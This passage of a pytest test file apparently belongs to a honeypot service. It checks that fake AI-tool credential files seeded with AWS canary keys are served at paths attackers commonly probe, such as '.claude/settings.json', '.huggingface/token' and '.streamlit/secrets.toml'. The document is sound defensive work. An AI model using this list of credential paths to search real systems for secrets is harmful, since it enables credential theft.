    assert "master_key: FwoGZXIvYXdzEXAMPLEFAKE=" in body
    assert "model_list:" in body


def test_render_litellm_db_password_is_per_hit_random():
    """LiteLLM proxy config embeds a Postgres URL — the password must be a
    per-hit synthetic, never a fixed literal across the fleet."""
    body1 = tbenv.render_litellm_config_yaml(FAKE_TRACEBIT).decode("utf-8")
    body2 = tbenv.render_litellm_config_yaml(FAKE_TRACEBIT).decode("utf-8")
    # Two renders should produce different DB passwords. Extract by regex.
    m1 = re.search(r"postgres://litellm:([^@]+)@", body1)
    m2 = re.search(r"postgres://litellm:([^@]+)@", body2)
    assert m1 and m2
    assert m1.group(1) != m2.group(1), "DB password must be per-hit unique, not a fixed literal"


def test_render_langsmith_env_embeds_aws_canary():
    body = tbenv.render_langsmith_env(FAKE_TRACEBIT).decode("utf-8")
    assert "LANGSMITH_API_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body
    assert "LANGCHAIN_API_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body


def test_render_huggingface_token_is_aws_canary_string():
    """HF tokens are single-line, no newline."""
    body = tbenv.render_huggingface_token(FAKE_TRACEBIT)
    assert body == b"AKIAFAKEEXAMPLE01"


def test_render_streamlit_secrets_toml_embeds_aws_canary():
    body = tbenv.render_streamlit_secrets_toml(FAKE_TRACEBIT).decode("utf-8")
    assert 'OPENAI_API_KEY = "AKIAFAKEEXAMPLE01"' in body
    assert 'ANTHROPIC_API_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"' in body
    assert "[database]" in body


def test_render_streamlit_db_password_is_per_hit_random():
    body1 = tbenv.render_streamlit_secrets_toml(FAKE_TRACEBIT).decode("utf-8")
    body2 = tbenv.render_streamlit_secrets_toml(FAKE_TRACEBIT).decode("utf-8")
    m1 = re.search(r'\[database\][^\[]*password = "([^"]+)"', body1, re.S)
    m2 = re.search(r'\[database\][^\[]*password = "([^"]+)"', body2, re.S)
    assert m1 and m2
    assert m1.group(1) != m2.group(1), "Streamlit DB password must be per-hit unique"


def test_render_generic_ai_provider_embeds_aws_canary():
    body = tbenv.render_generic_ai_api_config_json(FAKE_TRACEBIT)
    payload = json.loads(body)
    assert payload["api_key"] == "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    assert payload["apiKey"] == "AKIAFAKEEXAMPLE01"


def test_render_baseten_yaml_embeds_aws_canary():
    body = tbenv.render_baseten_yaml(FAKE_TRACEBIT).decode("utf-8")
    assert "api_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" in body


@pytest.mark.parametrize("path,expected_result,canary_substring", [
    ("/.claude/settings.json", "claude-settings", "AKIAFAKEEXAMPLE01"),
    ("/.cline/settings.json", "cline-settings", "AKIAFAKEEXAMPLE01"),
    ("/.cline/mcp_settings.json", "mcp-config", "AKIAFAKEEXAMPLE01"),
    ("/.continue/config.json", "continue-config", "AKIAFAKEEXAMPLE01"),
    ("/.sourcegraph/cody.json", "cody-config", "wJalrXUtnFEMI"),
    ("/.aider.conf.yml", "aider-conf", "AKIAFAKEEXAMPLE01"),
    ("/.config/open-interpreter/config.yaml", "open-interpreter-config", "wJalrXUtnFEMI"),
    ("/litellm_config.yaml", "litellm-config", "AKIAFAKEEXAMPLE01"),
    ("/langsmith.env", "langsmith-env", "wJalrXUtnFEMI"),
    ("/.huggingface/token", "huggingface-token", "AKIAFAKEEXAMPLE01"),
    ("/.cache/huggingface/token", "huggingface-token", "AKIAFAKEEXAMPLE01"),
    ("/.streamlit/secrets.toml", "streamlit-secrets", "AKIAFAKEEXAMPLE01"),
    ("/openai.json", "openai-config-flat", "AKIAFAKEEXAMPLE01"),
    ("/anthropic.json", "anthropic-config-flat", "AKIAFAKEEXAMPLE01"),
    ("/cohere_config.json", "ai-provider-config", "wJalrXUtnFEMI"),
    ("/.bito/config.json", "ai-provider-config", "wJalrXUtnFEMI"),
    ("/baseten.yaml", "baseten-config", "wJalrXUtnFEMI"),
])
async def test_dispatch_routes_ai_toolchain_paths_to_traps(
    flux_client, monkeypatch, path, expected_result, canary_substring,
):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "CANARY_TRAPS_ENABLED", True)
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)
    resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.93"})
    assert resp.status == 200, f"expected 200 for {path}"
    body = await resp.read()
    assert canary_substring.encode("utf-8") in body, f"{path} body missing {canary_substring}"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == expected_result
